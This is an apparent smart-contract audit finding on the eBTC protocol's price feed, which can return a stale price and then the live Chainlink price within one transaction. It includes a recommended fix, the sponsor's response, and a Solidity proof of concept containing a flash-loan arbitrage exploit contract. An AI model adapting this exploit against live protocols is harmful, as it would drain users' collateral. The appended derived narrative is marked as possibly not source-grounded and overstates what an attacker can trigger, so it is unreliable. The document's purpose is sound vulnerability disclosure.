---
id: 19375
severity: "Medium"
---

# `fetchPrice` can return different prices in the same transaction

## Description

```solidity
// --- CASE 5: Using Chainlink, Fallback is untrusted ---
if (status == Status.usingChainlinkFallbackUntrusted) {
    (...)
    // If the Chainlink price changes over 50%, return last good price and set status to bothOraclesUntrusted
    if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)) {
        _changeStatus(Status.bothOraclesUntrusted);
        return lastGoodPrice;
    }
```

In the scenario of the fallback oracle not set and the Chainlink oracle working correctly the status is `usingChainlinkFallbackUntrusted`. If the Chainlink price changes over 50%, the condition of line 340 evaluates to true, so the last good price is returned and the status is set to `bothOraclesUntrusted`.

```solidity
// --- CASE 3: Both oracles were untrusted at the last price fetch ---
if (status == Status.bothOraclesUntrusted) {
    /*
     * If there's no fallback, only use Chainlink
     */
    if (address(fallbackCaller) == address(0)) {
        // If CL has resumed working
        if (
            !_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse) &&
            !_chainlinkIsFrozen(chainlinkResponse)
        ) {
            _changeStatus(Status.usingChainlinkFallbackUntrusted);
            return _storeChainlinkPrice(chainlinkResponse.answer);
        }
    }
```

However, if the price is requested again and the Chainlink price still returns a price change over 50% from the previous round, having the status set to `bothOraclesUntrusted` will cause the condition of line 220 to evaluate to true and, given that the fallback oracle is not set and the Chainlink oracle is neither broken nor frozen, the price returned will be the current Chainlink price.

## Proof of Concept

PoC 1

This PoC shows that `fetchPrice` can return different prices in the same transaction when the Chainlink price changes over 50% and the fallback oracle is not set.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import {IPriceFeed} from "../contracts/Interfaces/IPriceFeed.sol";
import {PriceFeed} from "../contracts/PriceFeed.sol";
import {PriceFeedTester} from "../contracts/TestContracts/PriceFeedTester.sol";
import {MockTellor} from "../contracts/TestContracts/MockTellor.sol";
import {MockAggregator} from "../contracts/TestContracts/MockAggregator.sol";
import {eBTCBaseFixture} from "./BaseFixture.sol";
import {TellorCaller} from "../contracts/Dependencies/TellorCaller.sol";
import {AggregatorV3Interface} from "../contracts/Dependencies/AggregatorV3Interface.sol";

contract AuditPriceFeedTest is eBTCBaseFixture {
    address constant STETH_ETH_CL_FEED = 0x86392dC19c0b719886221c78AB11eb8Cf5c52812;

    PriceFeedTester internal priceFeedTester;
    MockAggregator internal _mockChainLinkEthBTC;
    MockAggregator internal _mockChainLinkStEthETH;
    uint80 internal latestRoundId = 321;
    int256 internal initEthBTCPrice = 7428000;
    int256 internal initStEthETHPrice = 9999e14;
    uint256 internal initStEthBTCPrice = 7428e13;
    address internal authUser;

    function setUp() public override {
        eBTCBaseFixture.setUp();
        eBTCBaseFixture.connectCoreContracts();
        eBTCBaseFixture.connectLQTYContractsToCore();

        // Set current and prev price
        _mockChainLinkEthBTC = new MockAggregator();
        _initMockChainLinkFeed(_mockChainLinkEthBTC, latestRoundId, initEthBTCPrice, 8);
        _mockChainLinkStEthETH = new MockAggregator();
        _initMockChainLinkFeed(_mockChainLinkStEthETH, latestRoundId, initStEthETHPrice, 18);

        priceFeedTester = new PriceFeedTester(
            address(0), // fallback oracle not set
            address(authority),
            address(_mockChainLinkStEthETH),
            address(_mockChainLinkEthBTC)
        );
        priceFeedTester.setStatus(IPriceFeed.Status.usingChainlinkFallbackUntrusted);

        // Grant permission on price feed
        authUser = _utils.getNextUserAddress();
        vm.startPrank(defaultGovernance);
        authority.setUserRole(authUser, 4, true);
        authority.setRoleCapability(4, address(priceFeedTester), SET_FALLBACK_CALLER_SIG, true);
        vm.stopPrank();
    }

    function _initMockChainLinkFeed(
        MockAggregator _mockFeed,
        uint80 _latestRoundId,
        int256 _price,
        uint8 _decimal
    ) internal {
        _mockFeed.setLatestRoundId(_latestRoundId);
        _mockFeed.setPrevRoundId(_latestRoundId - 1);
        _mockFeed.setPrice(_price);
        _mockFeed.setPrevPrice(_price);
        _mockFeed.setDecimals(_decimal);
        _mockFeed.setUpdateTime(block.timestamp);
    }

    function testPriceChangeOver50PerCent() public {
        uint256 lastGoodPrice = priceFeedTester.lastGoodPrice();

        // Price change over 50%
        int256 newEthBTCPrice = (initEthBTCPrice * 2) + 1;
        _mockChainLinkEthBTC.setPrice(newEthBTCPrice);

        // Get price
        uint256 newPrice = priceFeedTester.fetchPrice();
        IPriceFeed.Status status = priceFeedTester.status();
        assertEq(newPrice, lastGoodPrice); // last good price is used
        assertEq(uint256(status), 2); // bothOraclesUntrusted
        
        // Get price again in the same block (no changes in ChainLink price)
        newPrice = priceFeedTester.fetchPrice();
        status = priceFeedTester.status();
        assertGt(newPrice, lastGoodPrice * 2); // current ChainLink price is used
        assertEq(uint256(status), 4); // usingChainlinkFallbackUntrusted
    }
}
```

PoC 2

This PoC shows how to exploit the vulnerability to perform an arbitrage.

`PriceFeedTestnet.sol` has been edited to simulate the scenario proved in the previous test, where the first call to `fetchPrice` returns the last good price and the second call returns the current Chainlink price.

```diff
@@ -44,6 +44,12 @@ contract PriceFeedTestnet is IPriceFeed, Ownable, AuthNoOwner {
         return _price;
     }
 
+    bool private isFirstCall = true;
+
+    function setIsFirstCall(bool _isFirstCall) external {
+        isFirstCall = _isFirstCall;
+    }
+
     function fetchPrice() external override returns (uint256) {
         // Fire an event just like the mainnet version would.
         // This lets the subgraph rely on events to get the latest price even when developing locally.
@@ -53,8 +59,13 @@ contract PriceFeedTestnet is IPriceFeed, Ownable, AuthNoOwner {
                 _price = fallbackResponse.answer;
             }
         }
-        emit LastGoodPriceUpdated(_price);
-        return _price;
+
+        if (isFirstCall) {
+            isFirstCall = false;
+            return _price;
+        } else {
+            return _price * 2 + 1;
+        }
     }
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";

import {eBTCBaseFixture} from "./BaseFixture.sol";
import {IERC20} from "../contracts/Dependencies/IERC20.sol";
import {IERC3156FlashLender} from "../contracts/Interfaces/IERC3156FlashLender.sol";
import {IBorrowerOperations} from "../contracts/Interfaces/IBorrowerOperations.sol";
import {IERC3156FlashBorrower} from "../contracts/Interfaces/IERC3156FlashBorrower.sol";
import {ICdpManager} from "../contracts/Interfaces/ICdpManager.sol";
import {HintHelpers} from "../contracts/HintHelpers.sol";

contract AuditArbitrageTest is eBTCBaseFixture {
    FlashLoanBorrower internal flashBorrower;
    uint256 internal initialPrice;

    function setUp() public override {
        eBTCBaseFixture.setUp();
        eBTCBaseFixture.connectCoreContracts();
        eBTCBaseFixture.connectLQTYContractsToCore();

        // Create a CDP to have collateral in the protocol
        initialPrice = priceFeedMock.getPrice();
        uint256 _coll = 1_000e18;
        uint256 _debt = (_coll * initialPrice) / 200e16;
        dealCollateral(address(this), _coll + cdpManager.LIQUIDATOR_REWARD());
        collateral.approve(address(borrowerOperations), type(uint256).max);
        borrowerOperations.openCdp(_debt, bytes32(0), bytes32(0), _coll + cdpManager.LIQUIDATOR_REWARD());
        // Reset `isFirstCall` to true, as `fetchPrice` is called on `openCdp`
        priceFeedMock.setIsFirstCall(true);

        // Create flash loan borrower
        flashBorrower = new FlashLoanBorrower(
            address(collateral),
            address(eBTCToken),
            address(borrowerOperations),
            address(cdpManager),
            address(hintHelpers)
        );
    }

    function testArbitragePriceChangeOver50PerCent() public {
        assertEq(collateral.balanceOf(address(flashBorrower)), 0);
        assertEq(eBTCToken.balanceOf(address(flashBorrower)), 0);
        assertEq(activePool.getSystemCollShares(), 1_000e18);

        uint256 eBTCBborrowAmount = 10e18;
        flashBorrower.pwn(eBTCBborrowAmount, initialPrice);

        uint256 minExpectedCollProfit = 40e18;
        assertGt(collateral.balanceOf(address(flashBorrower)), minExpectedCollProfit);
        assertLt(collateral.balanceOf(address(flashBorrower)), 1_000e18 - minExpectedCollProfit);
    }
}

contract FlashLoanBorrower {
    IERC20 public immutable collateral;
    IERC20 public immutable eBTCToken;
    IBorrowerOperations public immutable borrowerOperations;
    ICdpManager public immutable cdpManager;
    HintHelpers public immutable hintHelpers;

    constructor(
        address _collateral,
        address _eBTCToken,
        address _borrowerOperations,
        address _cdpManager,
        address _hintHelpers
    ) {
        collateral = IERC20(_collateral);
        eBTCToken = IERC20(_eBTCToken);
        borrowerOperations = IBorrowerOperations(_borrowerOperations);
        cdpManager = ICdpManager(_cdpManager);
        hintHelpers = HintHelpers(_hintHelpers);
        collateral.approve(_borrowerOperations, type(uint256).max);
        eBTCToken.approve(_borrowerOperations, type(uint256).max);
    }

    function pwn(
        uint256 amount,
        uint256 price
    ) external {
        IERC3156FlashLender(address(borrowerOperations)).flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(eBTCToken),
            amount,
            abi.encodePacked(price)
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        uint256 price = abi.decode(data, (uint256));

        // Redeem collateral with `amount` eBTC at last valid price
        (bytes32 firstRedemptionHint, uint256 partialRedemptionHintNICR, , ) = hintHelpers
            .getRedemptionHints(amount, price, 0);
        cdpManager.redeemCollateral(
            amount,
            firstRedemptionHint,
            firstRedemptionHint,
            firstRedemptionHint,
            partialRedemptionHintNICR,
            0,
            1e18
        );

        // Open CDP with redeemed collateral at new price (now we receive more eBTC than `amount`)
        uint256 coll = collateral.balanceOf(address(this));
        uint256 newPrice = price * 2 + 1;
        uint256 debt = ((coll - 2e17 /*LIQUIDATOR_REWARD*/) * newPrice) / 110e16;
        bytes32 cdpId = borrowerOperations.openCdp(debt, bytes32(0), bytes32(0), coll);

        // Repay surplus eBTC and withdraw its proportional collateral
        uint256 availableEBTC = eBTCToken.balanceOf(address(this)) - (amount + fee);
        uint256 collToRedeem = (availableEBTC * 110e16) / newPrice;
        borrowerOperations.adjustCdp(cdpId, collToRedeem, availableEBTC, false, bytes32(0), bytes32(0));

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

## Recommendation

```solidity
// If Chainlink price has changed by > 50% between two consecutive rounds, compare it to Fallback's price
-           if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)) {
+           if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse) && address(fallbackCaller) != address(0)) {
                // If Fallback is broken, both oracles are untrusted, and return last good price
                // We don't trust CL for now given this large price differential
                if (_fallbackIsBroken(fallbackResponse)) {
                    _changeStatus(Status.bothOraclesUntrusted);
                    return lastGoodPrice;
                }
    (...)
    // If Chainlink is live but deviated >50% from it's previous price and Fallback is still untrusted, switch
    // to bothOraclesUntrusted and return last good price
-           if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)) {
+           if (_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse) && address(fallbackCaller) != address(0)) {
                _changeStatus(Status.bothOraclesUntrusted);
                return lastGoodPrice;
            }
```

The pre-requisite to this finding is CL having a 50% Deviation between two rounds.

This is extremely unlikely.

That said, the logic is incorrect and the finding is a valid gotcha we will fix.

I would suggest another fix approach different from above “Recommended Mitigation” since it make sense to set the status to `bothOraclesUntrusted` if fallback not set while CL got a big (>50%) reporting deviation between two rounds.

Using above “Recommended Mitigation” would result in exactly what it is trying to avoid: “the price returned will be the current Chainlink price”.

Since eBTC allows [empty fallback](https://github.com/ebtc-protocol/ebtc/commit/b9f999fb1a63193677be66d110e72ff5cca0bca6) (unlike original Liquity which always assumes the fallback is set) so additional checks are required to be executed around:
  * function `_bothOraclesLiveAndUnbrokenAndSimilarPrice()`
  * function `_bothOraclesSimilarPrice()`

to distinguish the scenarios when fallback is set (broken/frozen) AND when fallback is not set at all.

```solidity
function _bothOraclesLiveAndUnbrokenAndSimilarPrice(
    ChainlinkResponse memory _chainlinkResponse,
    ChainlinkResponse memory _prevChainlinkResponse,
    FallbackResponse memory _fallbackResponse
) internal view returns (bool) {
    // Return false if either oracle is broken or frozen
    if (
+      (address(fallbackCaller) != address(0) && (_fallbackIsBroken(_fallbackResponse) || _fallbackIsFrozen(_fallbackResponse))) ||
-       _fallbackIsBroken(_fallbackResponse) ||
-       _fallbackIsFrozen(_fallbackResponse) ||
        _chainlinkIsBroken(_chainlinkResponse, _prevChainlinkResponse) ||
        _chainlinkIsFrozen(_chainlinkResponse)
    ) {
        return false;
    }

    return _bothOraclesSimilarPrice(_chainlinkResponse, _fallbackResponse);
}

function _bothOraclesSimilarPrice(
    ChainlinkResponse memory _chainlinkResponse,
    FallbackResponse memory _fallbackResponse
) internal pure returns (bool) {
+       if (address(fallbackCaller) == address(0)){
+           return true;
+       }       
    // Get the relative price difference between the oracles. Use the lower price as the denominator, i.e. the reference for the calculation.
    uint256 minPrice = EbtcMath._min(_fallbackResponse.answer, _chainlinkResponse.answer);
    ......
}
```

And finally, we need to apply some extra guards in the state machine for status `bothOraclesUntrusted` and ensure that the price-similarity comparison between primary & fallback oracle happens **ONLY AFTER** other single-source checks (bad/frozen/max-deviation):

```solidity
function fetchPrice() external override returns (uint256) {
    ......
    // --- CASE 3: Both oracles were untrusted at the last price fetch ---
    if (status == Status.bothOraclesUntrusted) {
        /*
         * If there's no fallback, only use Chainlink
         */
        if (address(fallbackCaller) == address(0)) {
            // If CL has resumed working
            if (
                !_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse) &&
                !_chainlinkIsFrozen(chainlinkResponse)
+               && !_chainlinkPriceChangeAboveMax(chainlinkResponse, prevChainlinkResponse)
            ) {
                _changeStatus(Status.usingChainlinkFallbackUntrusted);
                return _storeChainlinkPrice(chainlinkResponse.answer);
            }
+           else {
+               return lastGoodPrice;
+           }
        }
    ......
    }
```

The PR for the fix is TBA

If the price oracle will be used for tokens with high volatility, I belive this should be at least a medium risk issue. However, if it’s only for BTC and stETH, it’s more like a QA under normal rules. The mitigation from the sponsor shows that it’s a safety design for price oracle. This fills the gap in the confidence interval of chainlink. I think it can be marked as a med risk, as a defence bypass instead of a price manipulation.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the price‑feed contract’s state‑machine logic that decides which oracle value to return from the function fetchPrice. When the primary Chainlink oracle reports a price that deviates by more than fifty percent from the previous round and the secondary (fallback) oracle is not configured, the contract moves its internal status to bothOraclesUntrusted and returns the stored lastGoodPrice. Immediately afterwards, because the fallback address is still zero, the next execution of fetchPrice checks that Chainlink is no longer broken or frozen and, without re‑evaluating the large deviation, switches the status back to usingChainlinkFallbackUntrusted. As a result the second call in the same transaction (or the same block) returns the current Chainlink price, which can be dramatically higher than the lastGoodPrice returned earlier. The root cause is an incomplete guard: the code only verifies the deviation when setting bothOraclesUntrusted, but it does not prevent the status from being reverted to a state that trusts Chainlink again, nor does it require the presence of a fallback oracle before marking bothOraclesUntrusted. Consequently, an attacker can trigger a >50 % price swing, cause the first fetchPrice call to emit a stale, low price, and then invoke fetchPrice again to obtain the fresh, high price. By using the stale price to redeem collateral or open a loan and the fresh price to open a new position, the attacker can extract profit through arbitrage, effectively making funds disappear from the protocol’s accounting. The issue manifests only when three conditions hold simultaneously: (1) the fallback oracle address is zero, (2) the Chainlink price change exceeds the 50 % threshold between two consecutive rounds, and (3) the contract’s status transitions from usingChainlinkFallbackUntrusted to bothOraclesUntrusted and back within the same transaction. Users of the protocol – borrowers, lenders, and any external contracts that rely on fetchPrice – are affected because they may receive inconsistent price data, leading to unexpected liquidation, loss of collateral, or unintended profit for an attacker. The problem was discovered during a formal audit by reproducing the scenario with mock Chainlink feeds and observing that fetchPrice returned different values on successive calls in a single test. It is hard to notice in normal operation because the large price deviation is rare, and the contract appears to function correctly when a fallback oracle is present. The fix requires adding explicit checks that a fallback oracle exists before marking bothOraclesUntrusted, ensuring that the large‑deviation guard remains active after a status change, and preventing the contract from reverting to a trusting state without re‑validating the price similarity. In practice this means augmenting the _bothOraclesLiveAndUnbrokenAndSimilarPrice and _bothOraclesSimilarPrice helpers with fallback‑address checks, inserting an extra guard in the bothOraclesUntrusted branch to return lastGoodPrice when a deviation is still present, and generally tightening the state‑machine so that price‑consistency is enforced across successive fetchPrice calls.
